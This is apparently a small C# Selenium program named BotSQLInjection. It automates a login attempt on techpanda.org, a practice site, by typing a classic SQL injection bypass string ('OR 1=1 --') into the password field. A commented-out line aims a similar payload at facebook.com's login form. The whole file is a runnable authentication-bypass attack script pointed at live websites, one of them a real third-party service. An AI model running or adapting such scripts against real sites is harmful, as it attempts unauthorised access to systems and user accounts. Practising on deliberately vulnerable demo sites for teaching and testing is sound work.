using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BotSQLInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            testLogin("http://www.techpanda.org", "email", "password", "input", "xxx@xxx.xxx", "xxx\') OR 1=1 -- ]");
            //testLogin("http://www.facebook.com", "email", "pass", "loginbutton", "\' OR 1=1\'--", "bundinha");

        }
        public static void testLogin(String url, String txtEmail, String txtSenha, String txtBotao, String vEmail, String vSenha)
        {
            IWebDriver driver = new ChromeDriver();

            driver.Navigate().GoToUrl(url);

            IWebElement email = driver.FindElement(By.Name(txtEmail));
            IWebElement senha = driver.FindElement(By.Name(txtSenha));
            IWebElement acharBtn = driver.FindElement(By.ClassName("element-submit"));
            IWebElement botao = acharBtn.FindElements(By.TagName(txtBotao))[0];
            email.SendKeys(vEmail);
            senha.SendKeys(vSenha);
            botao.Click();
        }
    }
}
